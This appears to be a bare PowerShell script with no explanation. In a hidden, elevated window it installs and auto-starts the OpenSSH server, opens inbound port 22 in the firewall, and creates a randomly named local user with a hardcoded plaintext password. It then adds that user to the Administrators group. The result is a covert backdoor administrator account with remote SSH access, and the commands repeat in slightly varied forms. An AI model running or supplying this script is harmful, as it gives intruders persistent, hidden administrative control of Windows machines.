Start-Process powershell -windowstyle hidden -verb RunAs -ArgumentList "Add-WindowsCapability -Online -name  OpenSSH.server~~~~0.0.1.0; dism /online /add-capability /capabilityName:OpenSSH.server~~~~0.0.1.0; Install-Module -force OpenSSHUtils; Start-Service sshd; Set-Service sshd -StartupType Automatic; mkdir $env:temp\test; $passwd = ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force; New-LocalUser 2969a0602e4efc9646e2 -Password $passwd; Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2; exit"


Add-WindowsCapability -Online -name  OpenSSH.server~~~~0.0.1.0
dism /online /add-capability /capabilityName:OpenSSH.server~~~~0.0.1.0
Install-Module -force OpenSSHUtils
Start-Service sshd
Set-Service sshd -StartupType Automatic
$passwd = ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force
New-LocalUser 2969a0602e4efc9646e2 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2 
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
$passwd = ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force
New-LocalUser 2969a0602e4efc9646e2 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2 
